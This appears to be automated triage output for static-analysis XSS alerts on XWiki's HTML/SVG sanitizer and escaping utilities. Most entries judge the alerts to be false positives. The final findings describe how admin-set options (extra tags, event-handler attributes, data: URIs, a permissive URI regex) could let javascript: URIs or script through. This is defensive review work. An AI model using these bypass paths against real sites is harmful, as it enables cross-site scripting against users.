Populated at lines 92-96 with standard safe SVG tags: svg, a, altglyph, animatecolor, animatetransform, circle, clippath, defs, desc, ellipse, filter, font, g, glyph, glyphref, hkern, image, line, lineargradient, marker, mask, metadata, mpath, path, pattern, polygon, polyline, radialgradient, rect, stop, style, switch, symbol, text, textpath, title, tref, tspan, view, vkern.

Used in isSafeTag() which feeds into SecureHTMLElementSanitizer.isElementSafe(). The list is consistent with DOMPurify's safe SVG element list.
evidence.notes: The CodeQL query seems to just enumerate fields - this is a structural analysis query, not detecting a specific flaw.

flags.message: Finding targets a field declaration that is part of a security allowlist implementation, not a vulnerability
flags.evidence: The `safeTags` field is a Set<String> that is populated with a DOMPurify-inspired allowlist of safe SVG tags. This is security-positive code, not a vulnerability.

flags.message: CWE-079 (XSS) flag on an allowlist sanitization component is backwards - this code is designed to prevent XSS
flags.evidence: SVGDefinitions.java is part of a secure HTML sanitizer (SecureHTMLElementSanitizer). The safeTags set is used to whitelist safe SVG elements, which is a standard XSS mitigation technique consistent with DOMPurify.

sanity_check.reasoning: This finding is a false positive. The `safeTags` field in SVGDefinitions.java is part of a defensive security mechanism - an allowlist of safe SVG tags used for HTML sanitization. The field declaration itself contains no vulnerability, and the populated values are standard safe SVG tags consistent with DOMPurify's allowlist. The CodeQL query appears to have flagged this field structurally without identifying any actual exploitable flaw. There is no XSS vulnerability here - this code prevents XSS.

findings.description: SVGDefinitions fields filterTags, allTags, allowedAttributes, commonHTMLElements, htmlIntegrationPoints - structural findings, not vulnerabilities
findings.reasoning:
These five SVGDefinitions fields (filterTags, allTags, allowedAttributes, commonHTMLElements, htmlIntegrationPoints) are all parts of a DOMPurify-inspired SVG allowlist sanitizer system. The CodeQL query appears to enumerate these fields structurally rather than identifying a specific exploitable vulnerability. 

- `filterTags`: SVG filter elements (feBlend, feColorMatrix, etc.) - all standard safe SVG filter tags
- `allTags`: Complete list of all SVG tags including unsafe ones (used for namespace detection), includes `script` and `foreignobject` which are deliberately tracked to be EXCLUDED from safe tags
- `allowedAttributes`: Standard SVG attributes including `style` and `href` - these are checked with URI validation in SecureHTMLElementSanitizer
- `commonHTMLElements`: Tags shared between HTML and SVG (title, style, font, a, script) - used for namespace transition handling to prevent mXSS
- `htmlIntegrationPoints`: SVG elements that can contain HTML children (foreignobject, desc, title, annotation-xml)

None of these represent direct vulnerabilities in themselves. The `allTags` including `script` is intentional - script is tracked as an SVG tag so it's NOT allowed as a pure SVG tag when processing namespace transitions (the isPureSVGTag check correctly handles this). The design is copied from DOMPurify.

evidence.code_context:
SVGDefinitions.java lines 50-58 declare the fields.
Lines 99-116 show initialization:
- filterTags: feBlend, feColorMatrix, etc. (standard SVG filter elements)
- allTags: animate, color-profile, foreignobject, script, set, etc. (ALL SVG tags for namespace detection)
- commonHTMLElements: title, style, font, a, script (shared HTML/SVG tags)
- htmlIntegrationPoints: foreignobject, desc, title, annotation-xml

Used in SanitizerFilter.isPureSVGTag():
```java
return this.svgDefinitions.isSVGTag(tagName) && (
    !this.svgDefinitions.isHTMLIntegrationPoint(parentTag.tagName)
        || !this.svgDefinitions.isCommonHTMLElement(tagName));
```

The 'script' tag being in allTags/commonHTMLElements is defensive - it ensures that inside SVG HTML integration points, script is treated as HTML (and blocked) rather than SVG.
evidence.notes: These fields are defensive security constructs, not vulnerabilities.

flags.message: Finding identifies field declarations in a security sanitizer class, not an actual vulnerability
flags.evidence: SVGDefinitions.java contains allowlist/denylist sets used by SanitizerFilter to sanitize SVG content. The fields filterTags, allTags, allowedAttributes, commonHTMLElements, and htmlIntegrationPoints are defensive security constructs.

flags.message: These are sanitizer definitions, not exploitable vectors. The presence of 'script' in allTags is intentional for proper detection/blocking.
flags.evidence: Code context shows SanitizerFilter.isPureSVGTag() uses these definitions to correctly categorize and block unsafe elements within SVG HTML integration points.

flags.message: CWE-079 (XSS) finding is misapplied to sanitizer infrastructure code that prevents XSS rather than introducing it
flags.evidence: The SVGDefinitions class is part of an XSS prevention system (DOMPurify-inspired SVG allowlist), not a source of XSS vulnerabilities. Flagging the defensive mechanism as the vulnerability is a false positive.

sanity_check.reasoning: The flagged code consists entirely of private final Set field declarations in a sanitizer class designed to prevent XSS in SVG content. These fields form an allowlist/denylist system inspired by DOMPurify and are used to properly classify SVG elements and block unsafe constructs. There is no exploitable vulnerability here; the static analysis tool appears to have structurally enumerated these fields without understanding their defensive purpose.

findings.description: EscapeTool methods xml, json, url, css, quotedPrintable, q, b, addQueryStringPair - these are properly implemented escaping utilities, not vulnerabilities
findings.reasoning:
All EscapeTool methods are properly implemented output-encoding utilities:

1. `xml()` (line 86): Delegates to `XMLUtils.escape()` - proper XML/HTML entity encoding
2. `json()` (line 102): Delegates to `StringEscapeUtils.escapeJson()` from Apache Commons Text - proper JSON encoding
3. `quotedPrintable()` (line 118): Uses `QuotedPrintableCodec` from Apache Commons Codec - valid encoding
4. `q()` (line 138): Uses `QCodec` from Apache Commons Codec - valid RFC 2047 encoding
5. `b()` (line 158): Uses `BCodec` from Apache Commons Codec - valid Base64 encoding
6. `url(Map)` (line 180): URL-encodes query parameters using `url()` method for each key/value
7. `addQueryStringPair()` (line 216): Private helper that applies `url()` encoding to key/value pairs
8. `css()` (line 239): Uses `CSSIdentifierSerializer` - proper CSS identifier escaping
9. `url(Object)` (line 258): Uses `URLEncoder.encode(string, "UTF-8")` with `+` to `%20` conversion

These are defense mechanisms - the escape tool is used in Velocity templates to properly encode output and prevent XSS. The CodeQL query appears to enumerate these methods structurally, not identifying actual vulnerabilities. There is no evidence of unsafe output or missing encoding in these implementations.

evidence.code_context:
EscapeTool.java key implementations:

xml() line 86:
  return XMLUtils.escape(Objects.toString(content, null)); // proper HTML entity encoding

json() line 102:
  return StringEscapeUtils.escapeJson(String.valueOf(string)); // Apache Commons Text JSON escaping

url() line 258:
  encodedURL = URLEncoder.encode(String.valueOf(string), "UTF-8");
  encodedURL = encodedURL.replaceAll("\\+", "%20"); // proper URL encoding

css() line 239:
  return new CSSIdentifierSerializer().serialize(identifier); // CSS identifier escaping

addQueryStringPair() line 216:
  String cleanValue = this.url(valueAsString); // applies url() encoding to values
evidence.notes: All methods use well-known, battle-tested libraries for encoding. These are sanitizers/encoders, not sources of vulnerabilities.

flags.message: EscapeTool methods are security utilities, not vulnerabilities
flags.evidence: All methods (xml, json, url, css, quotedPrintable, q, b) delegate to well-known, battle-tested encoding libraries: XMLUtils.escape(), StringEscapeUtils.escapeJson(), URLEncoder.encode(), CSSIdentifierSerializer, QuotedPrintableCodec, QCodec, BCodec

flags.message: Finding flags security sanitizers as XSS vulnerabilities, which is inverted logic
flags.evidence: CWE-079 (XSS) is about failure to sanitize output. This class IS the sanitization layer. Flagging sanitizers as XSS vulnerabilities is a fundamental misclassification.

sanity_check.reasoning: The EscapeTool class is explicitly designed as a security utility providing output encoding/escaping functions to prevent XSS and other injection attacks. All methods properly delegate to established, well-tested encoding libraries. Flagging this class as a CWE-079 vulnerability is a false positive - this is the mitigation layer, not the vulnerability. The current verdict of fp with 85% confidence is correct and should be maintained with higher confidence.

findings.description: HTMLElementSanitizerConfiguration extraAllowedTags/extraAllowedAttributes/extraURISafeAttributes/extraDataUriTags configuration options allow administrators to expand sanitizer allowlists, potentially introducing XSS
findings.reasoning:
The HTMLElementSanitizerConfiguration exposes several configuration options that can expand the sanitizer's allowlists:

1. `extraAllowedTags` - Can add arbitrary HTML/SVG tags to the allowlist. If an admin adds `script`, `iframe`, `object`, `embed`, etc., XSS becomes possible.
2. `extraAllowedAttributes` - Can add arbitrary attributes. Adding `onload`, `onerror`, `onclick` or other event handlers would enable XSS.
3. `extraURISafeAttributes` - Marks additional attributes as "URI-safe" (skips protocol checking). Adding `href` would skip all URI validation.
4. `extraDataUriTags` - Expands which elements can use `data:` URIs. Adding `a` or `div` could enable `data:text/html` XSS.

These are configuration-driven expansion points that require manual review to ensure proper access control is in place for who can modify these settings. If these configuration values are editable by untrusted users or insufficiently protected, they could weaken the sanitizer's protections.

However, since these are administrator-controlled configuration values (from a `ConfigurationSource`), exploiting them requires admin access - which is typically a trusted role. This requires manual review to confirm the trust model.

evidence.notes: The security impact depends entirely on who can write to the configuration source. Needs manual review of the access control model for these configuration keys.

flags.message: Exploitability depends entirely on access control model for configuration keys
flags.evidence: The finding notes that 'The security impact depends entirely on who can write to the configuration source.' If only administrators with equivalent system-level access can modify these settings, this is an intentional admin-level configuration feature, not a vulnerability. XWiki's configuration system typically requires admin privileges to modify.

flags.message: This represents a design trade-off between flexibility and security hardening
flags.evidence: The configuration keys like 'xml.htmlElementSanitizer.extraAllowedTags' are intentionally designed to allow administrators to extend sanitizer behavior. This is a documented feature, not a bug. The risk would only materialize if a lower-privileged user could modify these settings.

flags.message: Admin-controlled configuration expanding security allowlists may be by design
flags.evidence: In a CMS/wiki context like XWiki, allowing administrators to configure security policies is standard practice. The presence of both 'extra allowed' and 'forbid' configuration options suggests a deliberate, balanced security policy mechanism. This is analogous to CSP configuration, which admins legitimately control.

sanity_check.reasoning: The code accurately shows configuration constants for expanding HTML sanitizer allowlists, and the evidence confirms these are consumed in SecureHTMLElementSanitizer. However, whether this constitutes a vulnerability depends critically on the access control model - if only system administrators can modify these settings, this is intentional functionality rather than a vulnerability. The finding warrants manual review to determine the privilege level required to modify these configuration keys and whether there are scenarios where less-privileged users could influence them (e.g., through wiki-level configuration in XWiki's multi-tenant model).

findings.description: HTMLElementSanitizerConfiguration.allowedUriRegexp allows administrator-controlled regex to replace the URI protocol allowlist, potentially allowing dangerous protocols

evidence.notes: The isScriptOrData check is ONLY applied in the allowUnknownProtocols branch. The allowedUriPattern check is separate and has no script/data filter. A permissive custom regex could directly allow javascript: URIs.

flags.message: This is an administrator-controlled configuration, not user-controlled input
flags.evidence: The configuration key 'xml.htmlElementSanitizer.allowedUriRegexp' is set by administrators, not end users. Administrators are typically trusted actors in XWiki's security model. The threat model question is whether an admin misconfiguration can lead to XSS affecting other users.

flags.message: The finding accurately identifies that allowedUriPattern bypasses isScriptOrData checks
flags.evidence: The code evidence shows that in isAllowedValue(), the allowedUriPattern check is separate from the allowUnknownProtocols/isScriptOrData check. A permissive regex like '.*' would indeed allow javascript: URIs through the sanitizer, potentially enabling stored XSS for content sanitized by this library.

flags.message: Security impact depends on whether admins can be considered threat actors in this context
flags.evidence: XWiki is a wiki platform where the sanitizer is used to prevent XSS in user content. If an admin (who normally has full access) misconfigures this regex, other lower-privileged users' content could become vectors for XSS. However, in XWiki, admins can already execute arbitrary code, so this may not be a meaningful privilege escalation.

sanity_check.reasoning: The finding is technically accurate - the code evidence confirms that a permissive allowedUriRegexp would bypass the XSS protection for URI schemes, as the allowedUriPattern check runs independently of the isScriptOrData filter. However, since this is an administrator-controlled configuration in a library/framework context, the exploitability depends on the threat model: if administrators are trusted, this is a misconfiguration risk rather than a vulnerability; if the concern is admin-to-user attack vectors, it has more merit. The finding warrants manual review to assess the threat model and whether documentation/validation should be added to prevent dangerous regex values.
